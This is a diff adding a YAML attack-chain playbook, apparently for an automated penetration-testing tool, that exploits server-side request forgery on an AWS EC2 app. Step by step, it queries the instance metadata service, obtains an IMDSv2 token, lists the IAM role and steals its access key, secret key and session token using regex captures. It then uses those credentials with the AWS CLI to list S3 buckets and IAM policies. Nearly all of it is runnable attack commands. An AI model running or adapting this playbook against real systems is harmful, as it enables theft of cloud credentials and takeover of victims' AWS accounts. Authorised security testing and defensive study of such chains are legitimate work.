@@ -1,0 +1,117 @@
+id: aws-imds-ssrf
+name: "Cloud — SSRF → AWS IMDS → IAM role credentials"
+description: >
+  Server-Side Request Forgery on an EC2-hosted app gives you HTTP access
+  from inside the VPC. Hit the Instance Metadata Service (169.254.169.254)
+  to enumerate the instance role and steal its temporary AWS credentials.
+  IMDSv1 = free creds. IMDSv2 = one extra step.
+tags: [cloud, aws, ssrf, imds, post-exploitation]
+difficulty: medium
+
+inputs:
+  - name: ssrf_url
+    description: "Vulnerable URL that fetches arbitrary URLs (e.g. http://target/preview?url=)"
+    required: true
+
+steps:
+  - id: confirm_ssrf
+    name: "Confirm SSRF reaches internal IPs"
+    inline_command: "curl '<url>http://169.254.169.254/'"
+    inputs:
+      url: "${ssrf_url}"
+    notes: |
+      Should return some response (200 with the IMDS index, or 404, or
+      a connection-refused error if not on AWS). Anything but a generic
+      timeout is good news.
+
+  - id: detect_imds_version
+    name: "Detect IMDSv1 vs IMDSv2"
+    inline_command: "curl '<url>http://169.254.169.254/latest/meta-data/'"
+    inputs:
+      url: "${ssrf_url}"
+    notes: |
+      IMDSv1 returns the metadata index directly. IMDSv2 returns 401
+      "Unauthorized" — you need a token first.
+
+  - id: imdsv2_token
+    name: "Get IMDSv2 session token (skip on v1)"
+    inline_command: |
+      # Need SSRF that supports PUT + custom header; many do via param tricks:
+      curl -X PUT '<url>http://169.254.169.254/latest/api/token' \
+        -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'
+    inputs:
+      url: "${ssrf_url}"
+    notes: |
+      If SSRF only supports GET → you're stuck (this is exactly why IMDSv2
+      exists). Some apps proxy custom headers — check for `headers=` query
+      params or templated header forwarding.
+    capture:
+      - var: imds_token
+        regex: '([A-Za-z0-9+/=]{40,})'
+        match: first
+
+  - id: list_roles
+    name: "Enumerate the IAM role attached to the instance"
+    inline_command: |
+      # v1:
+      curl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+      # v2 (use token from previous step):
+      curl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
+        -H 'X-aws-ec2-metadata-token: <token>'
+    inputs:
+      url: "${ssrf_url}"
+    capture:
+      - var: aws_role_name
+        regex: '^([A-Za-z0-9_.-]+)$'
+        match: first
+
+  - id: steal_credentials
+    name: "Steal AccessKey + SecretKey + SessionToken"
+    inline_command: |
+      curl '<url>http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>'
+    inputs:
+      url: "${ssrf_url}"
+      role: "${aws_role_name}"
+    notes: |
+      Response JSON has AccessKeyId, SecretAccessKey, Token, Expiration.
+      Token lasts ~1-6 hours — race against the clock.
+    capture:
+      - var: aws_access_key
+        regex: '"AccessKeyId"\s*:\s*"([A-Z0-9]+)"'
+        match: first
+      - var: aws_secret_key
+        regex: '"SecretAccessKey"\s*:\s*"([A-Za-z0-9/+=]+)"'
+        match: first
+      - var: aws_session_token
+        regex: '"Token"\s*:\s*"([A-Za-z0-9/+=]+)"'
+        match: first
+
+  - id: enumerate_aws
+    name: "Use the credentials with AWS CLI"
+    inline_command: |
+      export AWS_ACCESS_KEY_ID='<key>'
+      export AWS_SECRET_ACCESS_KEY='<secret>'
+      export AWS_SESSION_TOKEN='<token>'
+      aws sts get-caller-identity
+      aws s3 ls
+      aws iam list-attached-role-policies --role-name '<role>'
+    inputs:
+      key: "${aws_access_key}"
+      secret: "${aws_secret_key}"
+      token: "${aws_session_token}"
+      role: "${aws_role_name}"
+    notes: |
+      With creds in hand: list S3 buckets, enumerate IAM, pacu/ScoutSuite
+      the account. The role often has more rights than just app-level
+      access (over-provisioned by default).
+
+references:
+  - title: "AWS IMDS docs"
+    url:   "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html"
+  - title: "HackTricks — AWS SSRF"
+    url:   "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
+
+next_chains:
+  - chain: shell-stabilization
+    when:   'AWS shell via SSM (rare)'
+    reason: 'If you escalated via SSM, stabilize.'
